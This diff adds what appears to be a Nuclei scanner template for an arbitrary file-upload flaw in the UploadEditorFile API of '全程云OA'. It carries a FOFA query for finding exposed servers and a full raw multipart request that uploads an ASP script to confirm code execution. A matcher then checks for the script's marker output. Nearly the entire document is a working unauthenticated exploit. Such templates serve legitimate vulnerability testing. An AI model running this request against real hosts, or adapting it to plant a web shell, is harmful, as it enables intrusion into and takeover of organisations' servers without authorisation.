@@ -1,0 +1,32 @@
+id: quancheng-cloud-oa-uploadeditorfile
+
+info:
+  name: "全程云OA UploadEditorFile 接口任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="images/yipeoplehover.png"
+        全程云OA系统集成了办公自动化、公文处理、档案管理等26个核心模块，包含超过100个子功能模块，用于提升企业信息流通效率及综合管理能力。经分析发现，该系统UploadEditorFile接口未正确校验文件上传权限，攻击者可利用此缺陷上传任意类型文件至服务器存储路径，最终可能导致远程代码执行或数据篡改风险。
+  tags: 全程云OA
+
+http:
+- raw:
+  - |
+    POST /OA/api/2.0/Common/AttachFile/UploadEditorFile HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=5b8ca40fac2569447025e7ab25beb369
+    Connection: close
+
+    --5b8ca40fac2569447025e7ab25beb369
+    Content-Disposition: form-data; name="upload"; filename="NTest.asp"
+
+    <% Response.Write("NdayTest"); set myfso=server.CreateObject("scripting.filesystemobject"); myfso.DeleteFile(Server.MapPath("NTest.asp")); %>
+    --5b8ca40fac2569447025e7ab25beb369--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
